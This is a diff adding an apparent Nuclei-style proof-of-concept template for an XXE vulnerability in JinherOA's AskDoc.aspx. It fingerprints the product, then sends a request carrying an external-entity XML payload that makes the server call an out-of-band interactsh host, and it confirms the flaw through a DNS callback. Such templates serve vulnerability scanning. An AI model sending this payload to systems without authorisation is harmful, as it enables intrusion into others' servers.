@@ -1,0 +1,40 @@
+id: poc-yaml-jinher-askdoc-aspx-xxe
+info:
+  name: JinherOA AskDoc.aspx XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.Ask/AskDoc.aspx/?GovFieldNormal=<?xml%20version="1.0"%20encoding="UTF-8"?><!DOCTYPE%20root%20[<!ENTITY%20%%20remote%20SYSTEM%20"http://{{reverse}}/xxe_test">%remote;]><root/> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SessionId="
+        part: header
+      - type: dsl
+        dsl:
+          - interactsh_protocol == "dns"
